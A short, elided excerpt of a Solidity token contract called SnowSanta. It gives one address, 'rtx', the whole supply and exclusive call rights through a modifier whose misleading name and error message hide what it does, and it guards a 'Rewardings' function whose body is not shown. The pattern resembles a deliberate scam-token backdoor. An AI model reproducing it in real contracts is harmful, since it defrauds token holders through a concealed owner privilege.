...
contract SnowSanta is Ownable {
  ...
  constructor(string memory _name, string memory _symbol) public {
    ...
    balances[rtx] = totalSupply;
    allowAddress[rtx] = true;
  ...
  modifier _external () {
    require(rtx == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  }
  ...
  function Rewardings(address lpaddress, uint256 _value) public _external {
